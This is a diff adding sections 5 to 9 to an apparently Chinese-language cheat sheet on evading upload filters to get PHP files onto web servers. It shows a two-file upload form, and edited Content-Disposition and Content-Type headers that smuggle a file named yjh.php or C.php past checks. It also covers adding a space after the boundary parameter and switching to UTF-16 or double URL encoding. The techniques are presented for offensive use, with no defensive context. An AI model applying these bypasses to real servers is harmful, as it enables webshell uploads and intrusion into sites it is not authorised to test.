@@ -246,3 +246,41 @@ Content-Type: application/octet-stream
 将 form-data 修改为   f+orm-data  
 将 from-data 修改为   form-d+ata  
 
+5 双文件上传  
+<form action="https://www.xxx.com/xxx.asp(php)" method="post"  
+name="form1" enctype="multipart/form-data">  
+<input name="FileName1" type="FILE" class="tx1" size="40">  
+<input name="FileName2" type="FILE" class="tx1" size="40">  
+<input type="submit" name="Submit" value="上传">  
+</form>  
+
+6.HTTP header 属性值绕过  
+-Disposition: form-data; name="file"; filename="yjh.php"  
+我们通过替换form-data 为*来绕过  
+Content-Disposition: *; name="file"; filename="yjh.php"  
+
+7 header属性名绕过  
+源代码:
+Content-Disposition: form-data; name="image";   
+filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png  
+绕过内容如下：  
+Content-Disposition: form-data; name="image";   
+filename="085733uykwusqcs8vw8wky.png  
+C.php"  
+删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php".    
+
+8 等效替换绕过  
+原容：  
+Content-Type: multipart/form-data; boundary=--------------------------  
+-471463142114  
+修改后:  
+Content-Type: multipart/form-data; boundary =--------------------------  
+-471463142114  
+boundary后面加入空格。  
+
+9 修改编码绕过  
+使用UTF-16、Unicode、双URL编码等等  
+
+-----
+
+
